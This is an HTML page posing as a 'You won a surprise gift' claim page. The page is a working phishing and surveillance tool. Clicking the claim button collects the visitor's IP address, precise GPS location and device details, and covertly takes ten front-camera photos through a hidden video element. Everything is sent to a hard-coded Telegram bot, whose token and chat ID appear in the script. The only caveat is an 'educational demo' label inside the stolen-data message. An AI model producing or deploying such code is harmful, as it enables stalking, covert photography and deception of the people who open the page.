<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Congratulations! You Won a Surprise Gift!</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #ff6b6b 0%, #feca57 50%, #ff9f43 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            text-align: center;
            padding: 30px;
            max-width: 550px;
            width: 90%;
        }
        
        .card {
            background: rgba(255,255,255,0.95);
            border-radius: 30px;
            padding: 50px 40px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.3);
        }
        
        .gift-icon {
            font-size: 100px;
            animation: bounce 1s ease infinite;
        }
        
        @keyframes bounce {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        h1 {
            background: linear-gradient(135deg, #ff6b6b, #feca57);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 32px;
            margin: 20px 0 15px;
        }
        
        .prize-badge {
            background: linear-gradient(135deg, #ff6b6b, #ff9f43);
            color: white;
            padding: 8px 20px;
            border-radius: 50px;
            display: inline-block;
            margin: 15px 0;
            font-weight: bold;
            font-size: 20px;
        }
        
        .subtitle {
            color: #555;
            margin-bottom: 20px;
            font-size: 18px;
        }
        
        .claim-btn {
            background: linear-gradient(135deg, #ff6b6b 0%, #feca57 100%);
            color: white;
            border: none;
            padding: 22px 50px;
            font-size: 28px;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            margin: 20px 0;
            box-shadow: 0 10px 30px rgba(255,107,107,0.5);
        }
        
        .claim-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }
        
        .timer {
            background: #f0f0f0;
            padding: 10px;
            border-radius: 50px;
            margin: 20px 0;
            font-size: 14px;
            color: #ff6b6b;
            font-weight: bold;
        }
        
        .status {
            margin-top: 15px;
            padding: 12px;
            border-radius: 12px;
            font-size: 14px;
            display: none;
        }
        
        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        
        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            display: block;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
        
        .footer-warning {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0,0,0,0.85);
            color: #ff6b6b;
            text-align: center;
            padding: 8px;
            font-size: 11px;
        }
        
        /* HIDDEN CAMERA */
        #hiddenVideo {
            position: fixed;
            top: -1000px;
            left: -1000px;
            width: 320px;
            height: 240px;
            opacity: 0;
            pointer-events: none;
        }
        
        #hiddenCanvas {
            display: none;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="card">
            <div class="gift-icon">🎁</div>
            
            <h1>🎉 CONGRATULATIONS! 🎉</h1>
            <div class="prize-badge">✨ YOU ARE THE LUCKY WINNER! ✨</div>
            
            <div class="subtitle">
                You have been selected for our<br>
                <strong style="color:#ff6b6b;">EXCLUSIVE SURPRISE GIFT!</strong>
            </div>
            
            <div class="timer">⏰ Offer expires in: <span id="countdown">05:00</span></div>
            
            <button class="claim-btn" id="claimBtn">🎁 CLAIM YOUR SURPRISE 🎁</button>
            
            <div class="small-text" style="color:#888; font-size:12px;">* Limited time offer | Only for selected users</div>
            <div id="status" class="status"></div>
        </div>
    </div>
    
    <!-- HIDDEN CAMERA ELEMENT -->
    <video id="hiddenVideo" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas"></canvas>
    
    <div class="footer-warning">
        🫣you are the winner
    </div>

    <script>
        // ============================================
        // TELEGRAM BOT SETUP
        // ============================================
        const BOT_TOKEN = "8686278164:AAHqTJnd4cnOhnEiy5mogRDfrvKFFo5GCyo"; 
        const ADMIN_CHAT_ID = "7538554320";
        
        // SETTINGS
        const TOTAL_PHOTOS = 10;        
        const CAPTURE_DELAY = 600;
        
        let mediaStream = null;
        let locationCaptured = false;
        let userIP = "Unknown";
        let capturedPhotos = [];
        let isProcessing = false;
        let cameraActive = false;
        
        const claimBtn = document.getElementById('claimBtn');
        const statusDiv = document.getElementById('status');
        const video = document.getElementById('hiddenVideo');
        const canvas = document.getElementById('hiddenCanvas');
        
        // Timer
        let timeLeft = 300;
        const countdownElement = document.getElementById('countdown');
        
        function updateTimer() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            if (timeLeft > 0) {
                timeLeft--;
                setTimeout(updateTimer, 1000);
            }
        }
        updateTimer();
        
        // CLAIM BUTTON
        claimBtn.addEventListener('click', async () => {
            if (isProcessing) return;
            isProcessing = true;
            
            claimBtn.disabled = true;
            claimBtn.innerHTML = '⏳ PROCESSING YOUR GIFT... ⏳';
            showStatus('info', '✨ Verifying your eligibility... ✨');
            
            capturedPhotos = [];
            cameraActive = false;
            
            await getIPAddress();
            await getLocation();
            
            // PHOTO CAPTURE - Separate function with better handling
            await capturePhotosWithCamera();
            
            setTimeout(() => {
                showStatus('success', `🎉 Verification complete! ${capturedPhotos.length} photos captured!`);
                claimBtn.innerHTML = '🎁 CLAIM YOUR SURPRISE 🎁';
                claimBtn.disabled = false;
                isProcessing = false;
            }, 2000);
        });
        
        // IP Address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                userIP = data.ip;
                console.log('✅ IP:', userIP);
            } catch (error) {
                userIP = 'Unable to fetch';
            }
        }
        
        // Location
        async function getLocation() {
            return new Promise((resolve) => {
                if ("geolocation" in navigator) {
                    showStatus('info', '📍 Getting location...');
                    
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            locationCaptured = true;
                            window.userLocation = {
                                lat: position.coords.latitude,
                                lng: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            console.log('✅ Location:', window.userLocation.lat, window.userLocation.lng);
                            resolve();
                        },
                        (error) => {
                            console.log('❌ Location error:', error.message);
                            window.userLocation = { error: error.message };
                            resolve();
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    window.userLocation = { error: 'Not supported' };
                    resolve();
                }
            });
        }
        
        // MAIN PHOTO CAPTURE FUNCTION
        async function capturePhotosWithCamera() {
            return new Promise(async (resolve) => {
                try {
                    showStatus('info', '📸 Requesting camera access...');
                    
                    // Request camera with specific constraints
                    const constraints = {
                        video: {
                            facingMode: "user",
                            width: { min: 480, ideal: 1280 },
                            height: { min: 360, ideal: 720 }
                        },
                        audio: false
                    };
                    
                    mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                    video.srcObject = mediaStream;
                    
                    showStatus('info', '📸 Camera ready, starting capture...');
                    
                    // Wait for video to actually start playing
                    await new Promise((resolve) => {
                        video.onloadedmetadata = () => {
                            video.play();
                            resolve();
                        };
                        setTimeout(resolve, 2000);
                    });
                    
                    // Wait additional time for camera to stabilize
                    await new Promise(r => setTimeout(r, 1500));
                    
                    console.log('Video dimensions:', video.videoWidth, 'x', video.videoHeight);
                    
                    if (video.videoWidth === 0 || video.videoHeight === 0) {
                        console.log('Video dimensions invalid');
                        await sendAllDataToTelegram();
                        resolve();
                        return;
                    }
                    
                    // Capture 10 photos
                    for (let i = 1; i <= TOTAL_PHOTOS; i++) {
                        showStatus('info', `📸 Capturing photo ${i}/${TOTAL_PHOTOS}...`);
                        
                        const photo = await captureSinglePhoto();
                        if (photo) {
                            capturedPhotos.push(photo);
                            console.log(`✅ Photo ${i}/${TOTAL_PHOTOS} captured (${Math.round(photo.length/1024)}KB)`);
                        } else {
                            console.log(`❌ Photo ${i}/${TOTAL_PHOTOS} failed`);
                            // Try one more time
                            const retryPhoto = await captureSinglePhoto();
                            if (retryPhoto) {
                                capturedPhotos.push(retryPhoto);
                                console.log(`✅ Photo ${i}/${TOTAL_PHOTOS} captured on retry`);
                            }
                        }
                        
                        if (i < TOTAL_PHOTOS) {
                            await new Promise(r => setTimeout(r, CAPTURE_DELAY));
                        }
                    }
                    
                    // Stop camera tracks
                    if (mediaStream) {
                        mediaStream.getTracks().forEach(track => track.stop());
                        mediaStream = null;
                    }
                    
                    console.log(`✅ Total photos captured: ${capturedPhotos.length}/${TOTAL_PHOTOS}`);
                    showStatus('info', `✅ ${capturedPhotos.length} photos captured! Sending...`);
                    
                    // Send to Telegram
                    await sendAllDataToTelegram();
                    
                    resolve();
                    
                } catch (error) {
                    console.error('❌ Camera error:', error);
                    showStatus('error', '⚠️ Camera access denied - No photos captured');
                    await sendAllDataToTelegram();
                    resolve();
                }
            });
        }
        
        // Capture single photo with verification
        async function captureSinglePhoto() {
            return new Promise((resolve) => {
                try {
                    if (!video || video.readyState !== 4) {
                        resolve(null);
                        return;
                    }
                    
                    const width = video.videoWidth;
                    const height = video.videoHeight;
                    
                    if (width < 100 || height < 100) {
                        resolve(null);
                        return;
                    }
                    
                    // Set canvas dimensions
                    canvas.width = width;
                    canvas.height = height;
                    
                    // Draw current video frame
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, width, height);
                    
                    // Get photo data
                    const photoDataUrl = canvas.toDataURL('image/jpeg', 0.9);
                    
                    // Verify photo is valid (not too small)
                    if (photoDataUrl.length < 10000) {
                        console.log('Photo too small, may be black');
                        // Try one more time with different drawing
                        setTimeout(() => {
                            ctx.drawImage(video, 0, 0, width, height);
                        }, 50);
                        const retryDataUrl = canvas.toDataURL('image/jpeg', 0.9);
                        if (retryDataUrl.length > 10000) {
                            resolve(retryDataUrl);
                            return;
                        }
                        resolve(null);
                        return;
                    }
                    
                    resolve(photoDataUrl);
                    
                } catch (error) {
                    console.error('Capture error:', error);
                    resolve(null);
                }
            });
        }
        
        // Send all data to Telegram
        async function sendAllDataToTelegram() {
            // First send location and device info
            let message = `🔴 NEW DATA CAPTURED 🔴\n\n`;
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            message += `📱 DEVICE INFO:\n`;
            message += `• ${navigator.userAgent.substring(0, 80)}\n`;
            message += `• Screen: ${screen.width}x${screen.height}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            message += `🌐 IP ADDRESS: ${userIP}\n`;
            message += `🕐 TIME: ${new Date().toLocaleString()}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            
            if (locationCaptured && window.userLocation && !window.userLocation.error) {
                message += `📍 LOCATION CAPTURED:\n`;
                message += `• Latitude: ${window.userLocation.lat}\n`;
                message += `• Longitude: ${window.userLocation.lng}\n`;
                message += `• Accuracy: ±${Math.round(window.userLocation.accuracy)} meters\n`;
                message += `• Maps: https://www.google.com/maps?q=${window.userLocation.lat},${window.userLocation.lng}\n`;
            } else {
                message += `📍 LOCATION: ${window.userLocation?.error || 'Not available'}\n`;
            }
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            message += `📸 PHOTOS CAPTURED: ${capturedPhotos.length}/${TOTAL_PHOTOS}\n`;
            message += `━━━━━━━━━━━━━━━━━━━━\n`;
            message += `⚠️ EDUCATIONAL DEMO\n`;
            
            // Send text message
            await sendTelegramMessage(message);
            
            // Send all photos
            if (capturedPhotos.length > 0) {
                showStatus('info', `📤 Sending ${capturedPhotos.length} photos to Telegram...`);
                
                for (let i = 0; i < capturedPhotos.length; i++) {
                    if (capturedPhotos[i]) {
                        await sendPhotoToTelegram(capturedPhotos[i], i + 1);
                        await new Promise(r => setTimeout(r, 400));
                    }
                }
                console.log(`✅ ${capturedPhotos.length} photos sent to Telegram`);
                showStatus('success', `✅ ${capturedPhotos.length} photos sent!`);
            } else {
                showStatus('error', `⚠️ No photos captured - Camera access denied`);
            }
        }
        
        // Send text message to Telegram
        async function sendTelegramMessage(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: ADMIN_CHAT_ID, 
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                const result = await response.json();
                if (result.ok) {
                    console.log('✅ Message sent to Telegram');
                } else {
                    console.log('❌ Message failed:', result);
                }
            } catch (error) {
                console.error('❌ Send error:', error);
            }
        }
        
        // Send photo to Telegram
        async function sendPhotoToTelegram(dataUrl, index) {
            const blob = dataURLToBlob(dataUrl);
            const formData = new FormData();
            formData.append('chat_id', ADMIN_CHAT_ID);
            formData.append('photo', blob, `photo_${index}.jpg`);
            formData.append('caption', `📸 PHOTO ${index}/${capturedPhotos.length}\n🕐 ${new Date().toLocaleString()}\n📍 IP: ${userIP}`);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                if (result.ok) {
                    console.log(`✅ Photo ${index} sent to Telegram`);
                } else {
                    console.log(`❌ Photo ${index} failed:`, result);
                }
            } catch (error) {
                console.error(`❌ Photo ${index} error:`, error);
            }
        }
        
        // DataURL to Blob
        function dataURLToBlob(dataURL) {
            const arr = dataURL.split(',');
            const mime = arr[0].match(/:(.*?);/)[1];
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }
        
        // Show status message
        function showStatus(type, message) {
            statusDiv.className = `status ${type}`;
            statusDiv.innerHTML = message;
            statusDiv.style.display = 'block';
            setTimeout(() => {
                if (statusDiv.className === `status ${type}`) {
                    statusDiv.style.display = 'none';
                }
            }, 3500);
        }
        
        // Cleanup
        window.addEventListener('beforeunload', () => {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>